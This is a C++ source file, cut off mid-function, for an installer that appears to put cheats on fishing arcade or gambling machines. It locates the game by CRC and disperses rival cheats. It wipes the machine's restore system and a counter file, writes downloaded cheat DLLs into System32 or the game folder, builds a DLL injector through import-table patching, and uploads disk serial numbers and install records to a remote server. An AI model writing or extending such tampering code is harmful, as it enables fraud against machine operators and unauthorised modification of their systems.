#include "Installer.h"
#include <filesystem>
#include <future>
#include <iostream>
#include <winioctl.h>
#include <Shlwapi.h>
#include <LogLib/Log.h>
#include <FileLib/File.h>
#include <CharacterLib/Character.h>
#include <ProcessLib/Common/ResHandleManager.h>
#include <TimeLib/TimeRand.h>
#include <DiskLib/DiskInfo/DiskInfo.h>
#include <AlgroithmLib/Encrypt/CRC32.h>
#include <CatchFishInstaller/Feature/Clear/ClearFile.h>
#include <ProcessLib/Common/ResHandleManager.h>
#include <AlgroithmLib/Encrypt/RC4.h>
#include <CatchFishInstaller/Feature/Upload/UploadFile.h>
#include <CatchFishInstaller/Feature/Socket/Client/IocpClient.h>
#include <CatchFishInstaller/Feature/Socket/Download/Downloader.h>
#include <AlgroithmLib/Encrypt/RSA.h>
#include <InjectorLib/DllInjector/DllInjector.h>
#include <CatchFishInstaller/Feature/DLL/GenerateDiskBuffer.h>


namespace dhj8938rwjf
{
	int __stdcall _添加导入表(const char* str_TargetDll, const char* str_AddDllName, const char* str_AddFunctionName);

	BOOL __stdcall _已修改过(void* pbuff_, DWORD lens, const char* str_AddDllName);
}

#ifdef _DEBUG
#pragma comment(lib,"LogLib_Debug.lib")
#pragma comment(lib,"TimeLib_Debug.lib")
#pragma comment(lib,"DiskLib_Debug.lib")
#pragma comment(lib,"AlgroithmLib_Debug.lib")
#else
#pragma comment(lib,"LogLib.lib")
#pragma comment(lib,"TimeLib.lib")
#pragma comment(lib,"DiskLib.lib")
#pragma comment(lib,"AlgroithmLib.lib")
#endif // _DEBUG

#pragma comment(lib,"Shlwapi.lib")

#define _SELF L"Installer.cpp"

CInstaller::CInstaller()
{
	_IsIngoreDiskSerialNumber = TRUE;
}

CInstaller& CInstaller::GetInstance()
{
	static CInstaller Instance;
	return Instance;
}

BOOL CInstaller::Install(_In_ CONST std::wstring& wsResultPath)
{
	GameIdentity Identifier;
	if (!Initialize(wsResultPath))
	{
		return FALSE;
	}

	CheckDirectory();
	if (GetGameIdentifier(Identifier))
	{
		std::wcout << L"准备下载文件." << std::endl;

		if (!libTools::CDiskInfo::GetDiskSerailNumber_BySCSI(_wchDisk, _wsDiskSerialNumber))
		{
			if (!SetSerialNumberDiskIsUnFormatDisk_IsUsb())
			{
				std::wcout << L"获取加密硬盘序列号失败!" << std::endl;
			}



			if (!libTools::CDiskInfo::GetDiskSerailNumber_BySCSI(_wchSerialNumberDisk, _wsDiskSerialNumber))
			{
				// 尝试用 ATA 格式取硬盘序列号
				if (!libTools::CDiskInfo::GetDiskSerialNumber_ByIdentify(_wchDisk, _wsDiskSerialNumber))
				{
					if (!SetSerialNumberDiskIsUnFormatDisk_IsUsb())
					{
						std::wcout << L"获取加密硬盘序列号失败!" << std::endl;
					}

					libTools::CDiskInfo::GetDiskSerialNumber_ByIdentify(_wchSerialNumberDisk, _wsDiskSerialNumber);
				}
			}
		}

		//_Printer(libTools::CCharacter::MakeFormatText(L"_wsDiskSerialNumber=[%s]", _wsDiskSerialNumber.c_str()));
		_wsDiskSerialNumber = libTools::CCharacter::Trim(_wsDiskSerialNumber);
		if (_wsDiskSerialNumber.empty())
		{
			if (!_IsIngoreDiskSerialNumber)
			{
				std::wcout << L"无法获取硬盘:" << _wchSerialNumberDisk << L" 的ID!" << std::endl;
				return FALSE;
			}
			else
			{
				_wsDiskSerialNumber = L"Empty";
			}
		}


		if (_pFishGameStructContent->IsRandDiskSerailNumber)
		{
			std::wstring wsRandSerialNumber;
			if (!GenerateRandSerialNumber(wsRandSerialNumber))
			{
				return FALSE;
			}


			_wsDiskSerialNumber += wsRandSerialNumber;
		}


		// DownLoad Cheat File
		std::wcout << L"正在下载文件 ." << std::endl;
		//std::wcout << L"DiskSerialNumber:" << _wsDiskSerialNumber.c_str() << std::endl;
		BOOL IsRunAsyc = TRUE;
		auto Printer = std::async(std::launch::async, [&IsRunAsyc]
			{
				while (IsRunAsyc)
				{
					std::wcout << L".";
					for (int i = 0; i < 10 && IsRunAsyc; ++i)
					{
						::Sleep(100);
					}
				}
			});
		if (!CDownloader::GetInstance().Download_CheatFile(Identifier, _VecCheatFile) || _VecCheatFile.empty())
		{
			IsRunAsyc = FALSE;
			Printer.wait();
			LOG_MSG_CF(L"下载游戏文件[%s-%s] 失败!", Identifier.wsGameType.c_str(), Identifier.wsGameName.c_str());
			return FALSE;
		}


		IsRunAsyc = FALSE;
		Printer.wait();
		return CopyCheatFileToSrc(Identifier);
	}
	else if (_VecCloseIdentifier.empty())
	{
		// 检查游戏然后上传
		for (auto& wchDisk : _VecDisk)
		{
			if (CUploadFile::GetInstance().IsExistCompatibleFile(wchDisk))
			{
				std::wcout << L"检测到未兼容的系列:" << CUploadFile::GetInstance().GetGameType().c_str() << std::endl;;
				std::wcout << L"路径:" << CUploadFile::GetInstance().GetGamePath().c_str() << std::endl;

				// Is Exist in Server~
				BOOL bResult = FALSE;
				if (!CUploadFile::GetInstance().IsExistGameFileInServer(bResult))
				{
					std::wcout << L"连接服务器失败!" << std::endl;
					return FALSE;
				}


				if (bResult)
				{
					std::wcout << L"上传完毕! 　等待工程师兼容......" << std::endl;
				}
				else
				{
					std::wcout << L"正在上传中: %00";
					BOOL IsRunAsyc = TRUE;
					auto Printer = std::async(std::launch::async, [&IsRunAsyc]
						{
							while (IsRunAsyc)
							{
								std::wcout << L'\b';
								std::wcout << L'\b';
								std::wcout << libTools::CCharacter::MakeFormatText(L"%02d", CUploadFile::GetInstance().GetUploadFilePercent()).c_str();
								for (int i = 0; i < 10 && IsRunAsyc; ++i)
								{
									::Sleep(100);
								}
							}

							std::wcout << L'\b';
							std::wcout << L'\b';
							std::wcout << L"100";
						});


					bResult = CUploadFile::GetInstance().UpLoadGameFile();
					IsRunAsyc = FALSE;
					Printer.wait();

					std::wcout << (bResult ? L"上传完毕!" : L"上传失败!") << std::endl;
				}
				return TRUE;
			}
		}

		std::wcout << L"无兼容的游戏!" << std::endl;
		return FALSE;
	}


	PrintSupportGameIdentifier();
	return FALSE;
}

BOOL CInstaller::InstallDumpTool()
{
	std::wcout << L"Switch Game: (Index)" << std::endl;
	std::wcout << L"---------------------------" << std::endl;
	std::wcout << L"1、盛世捕鱼系列" << std::endl;
	std::wcout << L"2、小鸟系列" << std::endl;
	std::wcout << L"---------------------------" << std::endl;


	std::wstring wsOption;
	std::getline(std::wcin, wsOption);
	if (wsOption == L"1")
	{
		_wsInjectorPathFile = L"BLFishs.exe";
	}
	else if (wsOption == L"2")
	{
		_wsInjectorPathFile = L"fish.exe";
	}
	else
	{
		std::wcout << std::endl << L"Invalid Option!" << std::endl;
		return FALSE;
	}



	std::wstring wsDisk;
	std::wcout << L"Target Disk:";
	std::wcin >> wsDisk;
	std::wcout << std::endl;



	if (!Initialize(libTools::CCharacter::MakeCurrentPath(L"\\")))
		return FALSE;



	_wchDisk = wsDisk[0];
	if (!CClearFile().Clear(_wchDisk, L""))
		return FALSE;



	if (!CDownloader::GetInstance().Download_DumpTool(_VecCheatFile))
	{
		std::wcout << L"Download Tools Faild!" << std::endl;
		return FALSE;
	}


	// Downloader DumpTool => Fish0.dll
	_wsCopyToDestPath = L"Z:\\Windows\\System32\\";
	_wsCopyToDestPath[0] = _wchDisk;
	return CopyDumpFileToSrc();
}

BOOL CInstaller::PullLog()
{
	std::wcout << L"Target Disk:";
	std::wcin >> _wchDisk;

	std::wstring wsFilePath = L"Z:\\Windows\\System32\\CFish.tmp";
	wsFilePath[0] = _wchDisk;

	if (!libTools::CFile::FileExist(wsFilePath))
	{
		std::wcout << L"File UnExist!!!" << std::endl;
		return FALSE;
	}


	LPVOID lpFileContent = nullptr;
	SIZE_T uFileSize = 0;
	if (!libTools::CFile::ReadFileContent(wsFilePath, lpFileContent, uFileSize))
	{
		std::wcout << L"Read File Content Faild!" << std::endl;
		return FALSE;
	}
	SetResDeleter(lpFileContent, [](LPVOID p) { ::VirtualFree(p, 0, MEM_RELEASE); });

	std::shared_ptr<BYTE> WriteFileBuffer(new BYTE[uFileSize + 16], [](BYTE * p) { delete[] p; });
	std::string Rc4Key;
	for (int i = 0; i < 16; ++i)
	{
		Rc4Key.push_back(static_cast<CHAR>(libTools::CTimeRand::GetRand(0x0, 0xFF)));
		WriteFileBuffer.get()[i] = static_cast<BYTE>(Rc4Key.back());
	}

	std::shared_ptr<CHAR> Rc4EncryptText = libTools::CRC4(Rc4Key.c_str(), 16).GetEncryptText(static_cast<CONST CHAR*>(lpFileContent), uFileSize);
	memcpy(WriteFileBuffer.get() + 16, Rc4EncryptText.get(), uFileSize);


	if (!libTools::CFile::WriteFile(libTools::CCharacter::MakeCurrentPath(L"\\") + L"Collect.dat", WriteFileBuffer.get(), uFileSize + 16))
	{
		std::wcout << L"Create File Faild!" << std::endl;
		return FALSE;
	}

	std::wcout << L"Create Collect.dat Succ!" << std::endl;
	return TRUE;
}

BOOL CInstaller::UnInstall()
{
	std::wcout << L"正在执行卸载..." << std::endl;
	CheckDirectory();
	for (auto& wchDisk : _VecDisk)
	{
		static std::wstring wsPath = L"Z:\\Windows\\System32\\uspdat.dat";
		wsPath[0] = wchDisk;

		if (libTools::CFile::FileExist(wsPath))
		{
			libTools::CFile::ForceDeleteFile(wsPath);
			std::wcout << L"卸载成功!" << std::endl;
		}
	}
	std::wcout << L"卸载完毕!" << std::endl;
	return TRUE;
}

VOID CInstaller::SetIngoreDiskSerialNumber()
{
	_IsIngoreDiskSerialNumber = TRUE;
}

BOOL CInstaller::IsExistGame(_In_ CONST std::wstring & wsTarFilePath)
{
	if (!Initialize(wsTarFilePath))
	{
		return FALSE;
	}


	for (auto& itm : _VecCatchFishStructContent)
	{
		if (itm.wsFullPath.empty())
		{
			LOG_MSG_CF(L"[%s-%s]的主路径 is empty", itm.Identifier.wsGameType.c_str(), itm.Identifier.wsGameName.c_str());
			continue;
		}


		BOOL Result = !itm.VecCode.empty();
		if (IsGameApplicationEqualCRC(wsTarFilePath, itm.dwFileCRC32))
			Result = TRUE;
		else
		{
			for (CONST auto& Code : itm.VecCode)
			{
				DWORD dwValue = 0;
				if (!ReadGameApplicationValue(wsTarFilePath, Code.dwAddr, dwValue) || Code.dwValue != dwValue)
				{
					Result = FALSE;
					break;
				}
			}
		}


		if (Result)
		{
			std::wcout << L"识别游戏是[" << itm.Identifier.wsGameType.c_str() << L" , " << itm.Identifier.wsGameName.c_str() << L" ]" << std::endl;
			return TRUE;
		}
	}


	std::wcout << L"无法识别!" << std::endl;
	return TRUE;
}

VOID CInstaller::RunTest()
{

}


VOID CInstaller::ClearRestoreSystem()
{
	std::wstring wsDisk;
	std::wcout << L"Input Disk:(H):";
	std::getline(std::wcin, wsDisk);


	static WCHAR wchPath[MAX_PATH] = { L"Z:\\Persi0.sys" };
	wchPath[0] = wsDisk[0];
	CClearFile::GetInstance().ClearGameRestoreSystem_YouLingQianTing(libTools::CCharacter::UnicodeToASCII(wchPath).c_str());
}


VOID CInstaller::ClearTheCount()
{
	std::wstring wsDisk;
	std::wcout << L"Input Disk:(H):";
	std::getline(std::wcin, wsDisk);

	static WCHAR wchPath[MAX_PATH] = { L"Z:\\Windows\\am.pdk" };
	wchPath[0] = wsDisk[0];

	if (libTools::CFile::FileExist(wchPath))
	{
		libTools::CFile::ForceDeleteFile(wchPath);
	}
	std::wcout << std::endl << L"Succ!" << std::endl;
}

VOID CInstaller::CheckDirectory()
{
	using fsPath = std::experimental::filesystem::v1::path;
	static std::wstring wsFile_Rundll32 = L"Z:\\Windows\\System32\\ntdll.dll";
	static std::wstring wsDirectory_Windows = L"Z:\\Windows";
	static std::wstring wsDirectory_DocAndSet = L"Z:\\Documents and Settings";
	static std::wstring wsDirectory_User = L"Z:\\Users";

	for (WCHAR wchDisk = L'D'; wchDisk <= L'Z'; wchDisk++)
	{
		wsDirectory_Windows[0] = wchDisk;
		wsFile_Rundll32[0] = wchDisk;
		wsDirectory_DocAndSet[0] = wchDisk;
		wsDirectory_User[0] = wchDisk;


		fsPath DirWindowsPath(wsDirectory_Windows);
		if (!std::experimental::filesystem::v1::is_directory(DirWindowsPath))
			continue;


		fsPath FileRundll32(wsFile_Rundll32);
		if (!std::experimental::filesystem::v1::exists(FileRundll32))
			continue;


		fsPath DirDocAndSet(wsDirectory_DocAndSet);
		fsPath DirUsers(wsDirectory_User);
		if (!std::experimental::filesystem::v1::is_directory(DirDocAndSet) && !std::experimental::filesystem::v1::is_directory(DirUsers))
			continue;


		_VecDisk.push_back(wchDisk);
	}
}

BOOL CInstaller::IsMatchGameRecognitionDirectory(_In_ CONST CatchFishStructContent & Content) CONST
{
	// Check Main Game Location
	if (!std::experimental::filesystem::v1::exists(std::experimental::filesystem::v1::path(Content.wsFullPath)))
		return FALSE;


	// Check Supplement File Path
	for (CONST auto& wsSupplementPath : Content.VecSupplementPath)
	{
		if (wsSupplementPath.empty())
			continue;


		// 目录结构
		if (!std::experimental::filesystem::v1::exists(std::experimental::filesystem::v1::path(wsSupplementPath)))
			return FALSE;


		// 复制目录
		if (!std::experimental::filesystem::v1::is_directory(Content.wsCopyDestPath))
			return FALSE;

	}
	return TRUE;
}

BOOL CInstaller::GetGameIdentifier(_Out_ GameIdentity & Ideneifier)
{
	std::wcout << L"正在匹配合适的游戏..." << std::endl;
	for (auto wchDisk : _VecDisk)
	{
		std::wcout << libTools::CCharacter::MakeFormatText(L"正在扫描盘符 [%c] 中...", wchDisk).c_str() << std::endl;
		for (auto& itm : _VecCatchFishStructContent)
		{
			if (itm.wsFullPath.empty())
			{
				LOG_MSG_CF(L"[%s-%s]的主路径 is empty", itm.Identifier.wsGameType.c_str(), itm.Identifier.wsGameName.c_str());
				continue;
			}


			WCHAR wchGameDisk = wchDisk;
			if (itm.IsDifferenceDisk && !FindOtherDisk_By_Disk(wchDisk, wchGameDisk)) // 寻找相同硬盘下的逻辑磁盘, 重新设置wchDisk
				continue;


			// 设置当前盘符
			*itm.wsCopyDestPath.begin() = wchDisk;
			*itm.wsFullPath.begin() = wchGameDisk;
			std::for_each(itm.VecSupplementPath.begin(), itm.VecSupplementPath.end(), [wchGameDisk](std::wstring& wsPath)
			{
				if (!wsPath.empty())
				{
					*wsPath.begin() = wchGameDisk;
				}
			});


			std::wcout << libTools::CCharacter::MakeFormatText(L"正在对比游戏 [%s , %s ]", itm.Identifier.wsGameType.c_str(), itm.Identifier.wsGameName.c_str()).c_str() << std::endl;


			BOOL Result = !itm.VecCode.empty();
			if (itm.uFileSize != 0 && IsGameApplicationEqualFileSize(itm.wsFullPath, itm.uFileSize))
				Result = TRUE;
			else if (itm.dwFileCRC32 != 0 && IsGameApplicationEqualCRC(itm.wsFullPath, itm.dwFileCRC32))
				Result = TRUE;
			else
			{
				std::wcout << L"正在识别目录" << std::endl;
				if (!IsMatchGameRecognitionDirectory(itm))
					continue;


				//std::wcout << L"正在下载游戏数据 [" << itm.Identifier.wsGameType.c_str() << L"," << itm.Identifier.wsGameName.c_str() << L"]" << std::endl;
				for (CONST auto& Code : itm.VecCode)
				{
					DWORD dwValue = 0;
					if (!ReadGameApplicationValue(itm.wsFullPath, Code.dwAddr, dwValue) || Code.dwValue != dwValue)
					{
						Result = FALSE;
						break;
					}
				}
			}

			if (Result)
			{
				_wchDisk = wchDisk;
				std::wcout << L"准备执行清理程序!" << std::endl;
				CClearFile::GetInstance().SetIsDisableDeleteGameDirectoryInjectorFile(itm.IsDisableDeleteGameDirectoryInjectorFile);
				if (!CClearFile::GetInstance().Clear(_wchDisk, itm.wsFullPath))
				{
					std::wcout << L"检测到别人的作弊文件无法清除!" << std::endl;
					return FALSE;
				}
				if (!CClearFile::GetInstance().ClearGameRestoreSystem(_wchDisk, itm.Identifier))
				{
					std::wcout << L"执行清理程序失败!" << std::endl;
					return FALSE;
				}

				_wsCopyToDestPath = itm.wsCopyDestPath;
				if (itm.wsInjectorPath.empty())
				{
					_wsInjectorPathFile = itm.wsFullPath;
					_wsInjectorPathFile.erase(_wsInjectorPathFile.begin(), _wsInjectorPathFile.begin() + 3);
				}
				else
				{
					_wsInjectorPathFile = itm.wsInjectorPath;
				}


				_wchSerialNumberDisk = wchDisk;
				Ideneifier = itm.Identifier;
				_pFishGameStructContent = &itm;
				return TRUE;
			}
			else
			{
				_VecCloseIdentifier.push_back(itm.Identifier);
			}
		}
	}


	return FALSE;
}

BOOL CInstaller::ReadGameApplicationValue(_In_ CONST std::wstring & wsFilePath, _In_ DWORD dwAddr, _Out_ DWORD & dwValue)
{
	LPVOID lpFileContent = nullptr;
	SIZE_T uFileSize = 0;


	if (!libTools::CFile::ReadFileContent(wsFilePath, lpFileContent, uFileSize))
	{
		LOG_MSG_CF(L"读取文件的内容失败:[%s]", wsFilePath.c_str());
		return FALSE;
	}


	SetResDeleter(lpFileContent, [](LPVOID & Pointer) { ::VirtualFree(Pointer, 0, MEM_RELEASE); Pointer = nullptr; });
	IMAGE_DOS_HEADER* pDosHeader = static_cast<IMAGE_DOS_HEADER*>(lpFileContent);
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		LOG_MSG_CF(L"游戏文件是一个无效的PE文件!");
		return FALSE;
	}


	IMAGE_NT_HEADERS* pNtHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(pDosHeader->e_lfanew + reinterpret_cast<DWORD>(lpFileContent));
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		LOG_MSG_CF(L"游戏文件的NT头 无效!");
		return FALSE;
	}



	DWORD dwFileOffset = 0;
	IMAGE_SECTION_HEADER* pSectionHeader = nullptr;
	for (DWORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; ++i)
	{
		pSectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<DWORD>(pNtHeader) + (i + 1) * sizeof(IMAGE_NT_HEADERS));
		if (strcmp(reinterpret_cast<CONST CHAR*>(pSectionHeader->Name), ".text") == 0x0)
		{
			dwFileOffset = dwAddr - pSectionHeader->VirtualAddress - pNtHeader->OptionalHeader.ImageBase;
			break;
		}
	}


	if (dwFileOffset == 0)
	{
		LOG_MSG_CF(L"游戏文件错误: 找不到节表.text");
		return FALSE;
	}


	dwValue = *reinterpret_cast<DWORD*>(reinterpret_cast<DWORD>(lpFileContent) + dwFileOffset + pSectionHeader->PointerToRawData);
	return TRUE;
}

BOOL CInstaller::IsGameApplicationEqualCRC(_In_ CONST std::wstring & wsFilePath, _In_ DWORD dwCRC32) CONST
{
	struct FileCRCContent
	{
		DWORD dwFileCRC;
		std::wstring wsPath;
	};

	// CRC Cache 
	static std::vector<FileCRCContent> Vec;
	auto itr = std::find_if(Vec.begin(), Vec.end(), [wsFilePath](CONST FileCRCContent & itm) { return itm.wsPath == wsFilePath; });
	if (itr != Vec.end())
	{
		return itr->dwFileCRC == dwCRC32;
	}



	LPVOID lpFileContent = nullptr;
	SIZE_T uFileSize = 0;


	if (!libTools::CFile::FileExist(wsFilePath))
	{
		return FALSE;
	}
	if (!libTools::CFile::ReadFileContent(wsFilePath, lpFileContent, uFileSize))
	{
		LOG_MSG_CF(L"读取文件的内容失败:[%s]", wsFilePath.c_str());
		return FALSE;
	}


	SetResDeleter(lpFileContent, [](LPVOID & Pointer) { ::VirtualFree(Pointer, 0, MEM_RELEASE); Pointer = nullptr; });


	FileCRCContent Content;
	Content.wsPath = wsFilePath;
	Content.dwFileCRC = libTools::CCRC32::GetCRC32(reinterpret_cast<LPCSTR>(lpFileContent), uFileSize);
	Vec.push_back(Content);


	return Content.dwFileCRC == dwCRC32;
}

BOOL CInstaller::IsGameApplicationEqualFileSize(_In_ CONST std::wstring & wsFilePath, _In_ UINT uFileSize) CONST
{
	//_Printer(libTools::CCharacter::MakeFormatText(L"对比文件:[%s] 的大小[%d] == [%d]", wsFilePath.c_str(), libTools::CFile::GetFileSize(wsFilePath), uFileSize));
	return libTools::CFile::GetFileSize(wsFilePath) == uFileSize;
}

BOOL CInstaller::CopyCheatFileToSrc(_In_ CONST GameIdentity & Ideneifier)
{
	std::wcout << L"正在安装..." << std::endl;
	for (CONST auto& itm : _VecCheatFile)
	{
		std::experimental::filesystem::v1::path DestFile(_wsCopyToDestPath + itm.wsFileName);
		if (!libTools::CFile::ForceDeleteFile(DestFile.wstring())) // Delete Old File
		{
			LOG_MSG_CF(L"删除旧文件[%s] 失败!", DestFile.wstring().c_str());
			return FALSE;
		}

		// Create File
		//::SetFileAttributesW(DestFile.wstring().c_str(), FILE_ATTRIBUTE_NORMAL);
		if (!libTools::CFile::WriteFile(DestFile.wstring(), reinterpret_cast<CONST BYTE*>(itm.FileContent.get()), itm.uFileSize))
		{
			LOG_MSG_CF(L"创建文件失败!", DestFile.wstring().c_str());
			return FALSE;
		}
	}

	// 创建注入进程文件
	std::wcout << L"正在创建注入文件 ..." << std::endl;
	if (!CreateInjectorProcFile())
	{
		std::wcout << L"创建注入文件失败!" << std::endl;
		return FALSE;
	}

	std::wcout << L"正在创建 测试码 和取次码" << std::endl;
	ViewTestCode(Ideneifier);
	return TRUE;
}

BOOL CInstaller::CopyDumpFileToSrc()
{
	std::wcout << L"Installing Dump Tools" << std::endl;
	for (CONST auto& itm : _VecCheatFile)
	{
		std::experimental::filesystem::v1::path DestFile(_wsCopyToDestPath + itm.wsFileName);
		if (!libTools::CFile::ForceDeleteFile(DestFile.wstring())) // Delete Old File
		{
			LOG_MSG_CF(L"删除旧文件[%s] 失败!", DestFile.wstring().c_str());
			return FALSE;
		}

		// Create File
		//::SetFileAttributesW(DestFile.wstring().c_str(), FILE_ATTRIBUTE_NORMAL);
		if (!libTools::CFile::WriteFile(DestFile.wstring(), reinterpret_cast<CONST BYTE*>(itm.FileContent.get()), itm.uFileSize))
		{
			LOG_MSG_CF(L"创建文件失败!", DestFile.wstring().c_str());
			return FALSE;
		}
	}

	// 创建注入进程文件
	if (!CreateInjectorProcFile())
	{
		std::wcout << L"创建注入文件失败!" << std::endl;
		return FALSE;
	}


	std::wcout << L"Done!" << std::endl;
	return TRUE;
}

VOID CInstaller::PrintSupportGameIdentifier() CONST
{
	if (!_VecCloseIdentifier.empty())
	{
		std::wcout << L"需要远程兼容:" << std::endl;
		for (CONST auto& Identifier : _VecCloseIdentifier)
		{
			std::wcout << L"与游戏[" << Identifier.wsGameType.c_str() << L"] 兼容" << std::endl;
		}
	}
	else
	{
		std::wcout << L"检测不到兼容的版本!" << std::endl;
	}
}

BOOL CInstaller::GetDiskSerialNumber(_In_ WCHAR wchDisk)
{
	return libTools::CDiskInfo::GetDiskSerailNumber_BySCSI(wchDisk, _wsDiskSerialNumber);
}

VOID CInstaller::ViewTestCode(_In_ CONST GameIdentity & Ideneifier)
{
	SYSTEMTIME SysTime;
	::GetLocalTime(&SysTime);


	InstallDiskRecord_Tranfer Content;
	std::wstring wsCountCode, wsTestCode, wsEncryptLogPath, wsUnDeadCode;
	Content.wsOriginDiskSerialNumber = _wsDiskSerialNumber;
	Content.Identifier = Ideneifier;
	if (!CDownloader::GetInstance().GetGenerateCode(Ideneifier, _wsDiskSerialNumber, wsCountCode, wsTestCode))
	{
		std::wcout << L"从服务器上下载测试码和取次码失败!" << std::endl;
		return;
	}

	Content.wsEncryptDiskSerialNumber = _wsDiskSerialNumber;


	if (!FillInstallDiskRecord(Content))
		return;


	// 上传安装记录 , 安装记录是加密的ID
	CDownloader::GetInstance().Upload_InstallRecord(Content);

	std::wcout << L"输出目录:[" << _wsResultPath.c_str() << L"]" << std::endl;
	std::wstring wsFilePath = _wsResultPath + L"\\";
	wsFilePath += libTools::CCharacter::MakeFormatText(L"[%s-%s]-%04d%02d%02d%-02d%02d%02d", _pFishGameStructContent->Identifier.wsGameType.c_str(), _pFishGameStructContent->Identifier.wsGameName.c_str(), SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute, SysTime.wSecond);


	wsFilePath = libTools::CCharacter::Replace<WCHAR>(wsFilePath, L"\"", L"");
	wsEncryptLogPath = wsFilePath + L".EncLog";
	wsFilePath += L".txt";
	wsFilePath.erase(std::remove(wsFilePath.begin(), wsFilePath.end(), L'\"'));



	FillFishViewFile(wsFilePath, wsCountCode, wsTestCode, wsUnDeadCode);
	SaveToEncryptLog(Content, wsEncryptLogPath, wsTestCode, wsCountCode);


	std::async(std::launch::async, [wsFilePath]
		{
			std::string Cmd = "\"";
			Cmd += libTools::CCharacter::UnicodeToASCII(wsFilePath).c_str();
			Cmd += "\"";
			system(Cmd.c_str());
		});

	std::wcout << L"安装完毕!!! 5s后自动关闭!" << std::endl;
	::Sleep(5 * 1000);
	exit(0);
}

BOOL CInstaller::FillFishViewFile(_In_ CONST std::wstring & wsPath, _In_ CONST std::wstring & wsCounterCode, _In_ CONST std::wstring & wsCheatCode, _In_ CONST std::wstring&)
{
	SYSTEMTIME SysTime;
	::GetLocalTime(&SysTime);


	libTools::CFile::AppendUnicodeFile(wsPath, libTools::CCharacter::MakeFormatText(L"游戏名:[%s-%s]", _pFishGameStructContent->Identifier.wsGameType.c_str(), _pFishGameStructContent->Identifier.wsGameName.c_str()));
	libTools::CFile::AppendUnicodeFile(wsPath, libTools::CCharacter::MakeFormatText(L"生成完毕时间:%d年%d月%d日 %d:%d:%d", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute, SysTime.wSecond));
	libTools::CFile::AppendUnicodeFile(wsPath, libTools::CCharacter::MakeFormatText(L"ID:%s", GenerateEncodeSerailNumber(_wsDiskSerialNumber).c_str()));
	libTools::CFile::AppendUnicodeFile(wsPath, libTools::CCharacter::MakeFormatText(L"测试码:%s", wsCheatCode.c_str()));
	libTools::CFile::AppendUnicodeFile(wsPath, libTools::CCharacter::MakeFormatText(L"取次码:%s", wsCounterCode.c_str()));


	if (_pFishGameStructContent->IsNewFramework)
	{
		libTools::CFile::AppendUnicodeFile(wsPath, L"\r\n\r\n\r\n");
		libTools::CFile::AppendUnicodeFile(wsPath, L"-----------新打法---------------------------");
		libTools::CFile::AppendUnicodeFile(wsPath, L"测试码只能用一次(不影响次数)");
		//libTools::CFile::AppendUnicodeFile(wsPath, L"不死码:" + wsUnDeadCode);
	}

	return TRUE;
}

BOOL CInstaller::GenerateRandSerialNumber(_Out_ std::wstring & wsRandSerailNumber) CONST
{
	using fsPath = std::experimental::filesystem::v1::path;
	static std::wstring wsSysDirectoryX86 = L"Z:\\Windows\\System32\\ntdll.dll";
	static std::wstring wsSysDirectoryX64 = L"Z:\\Windows\\SysWOW64\\ntdll.dll";

	wsSysDirectoryX64[0] = _wchDisk;
	wsSysDirectoryX86[0] = _wchDisk;



	// 判断是否x64系统
	std::wstring wsPath;
	if (std::experimental::filesystem::exists(fsPath(wsSysDirectoryX64)))
	{
		wsPath = L"Z:\\Windows\\SysWOW64\\up.dat";
		wsPath[0] = _wchDisk;
	}
	else
	{
		wsPath = L"Z:\\Windows\\System32\\up.dat";
		wsPath[0] = _wchDisk;
	}



	if (!libTools::CFile::ForceDeleteFile(wsPath.c_str()))
	{
		std::wcout << L"修改文件失败! Err = -11" << std::endl;
		return FALSE;
	}



	wsRandSerailNumber = libTools::CCharacter::MakeFormatText(L"|%08X", libTools::CTimeRand::GetRand(0x1FFFFFFF, 0x7FFFFFFF));
	if (!libTools::CFile::WriteASCIIFile(wsPath, wsRandSerailNumber))
	{
		std::wcout << L"修改文件失败! Err = 11" << std::endl;
		return FALSE;
	}

	return TRUE;
}

BOOL CInstaller::FillInstallDiskRecord(_Out_ InstallDiskRecord_Tranfer & Content) CONST
{
	return GenerateAllDisk(Content);
}

BOOL CInstaller::GenerateAllDisk(_Out_ InstallDiskRecord_Tranfer & Content) CONST
{
	// Release DLL 
	std::wstring wsDiskText;
	if (!ReleaseDiskDLL(wsDiskText))
		return FALSE;


	std::vector<std::wstring> VecLine;
	libTools::CCharacter::Split(wsDiskText, L"\r\n", VecLine, libTools::CCharacter::em_Split_Option_KeepOnly_RemoveEmptyEntries);
	for (auto& Line : VecLine)
	{
		SingleInstallDiskRecord itm;

		std::vector<std::wstring> VecLineElement;
		libTools::CCharacter::Split(Line, L",", VecLineElement, libTools::CCharacter::em_Split_Option_KeepOnly_RemoveEmptyEntries);
		if (VecLineElement.size() != 4)
			continue;


		//disk=[0], issystemdisk=[0], size=[00000000008587192320], sn=[xxxxxxxxxxxxxxxxxxxx]
		std::vector<std::wstring> Vec;
		if (!libTools::CCharacter::SplitFormatText(Line, L"disk=[*], issystemdisk=[*], size=[*], sn=[*]", Vec))
			continue;


		itm.dwPhysicsDiskIndex = std::stoi(Vec.at(0));
		itm.dwDiskSize = static_cast<DWORD>(std::stoll(Vec.at(2)) / 1000 / 1000 / 1000);

		// 
		auto wsSn = Vec.at(3);
		Vec.clear();

	
		if (!libTools::CCharacter::SplitFormatText(wsSn, L"[*|||*|||*|||*]", Vec) || Vec.size() != 4)
			continue;


		itm.wsDiskSerialNumber = Vec.at(3);;
		itm.wsOriginText = Line;
		Content.Vec.push_back(itm);
	}

	return TRUE;
}

BOOL CInstaller::ReleaseDiskDLL(_Out_ std::wstring & wsText) CONST
{
	WCHAR wszPath[MAX_PATH] = { 0 };
	::GetTempPathW(MAX_PATH, wszPath);
	if (wszPath[wcslen(wszPath) - 1] != L'\\')
		::lstrcatW(wszPath, L"\\");

	::lstrcatW(wszPath, L"hrdv.dll");
	if (!libTools::CFile::FileExist(wszPath) && !libTools::CFile::WriteFile(wszPath, GenerateDiskBuffer, sizeof(GenerateDiskBuffer)))
	{
		LOG_MSG_CF(L"释放hrdv.dll失败!");
		return FALSE;
	}


	HMODULE hmDLL = ::LoadLibraryW(wszPath);
	if (hmDLL == NULL)
	{
		LOG_MSG_CF(L"加载hrdv.dll失败!");
		return FALSE;
	}


	using hrdvPtr = CHAR * (WINAPIV*)(void);
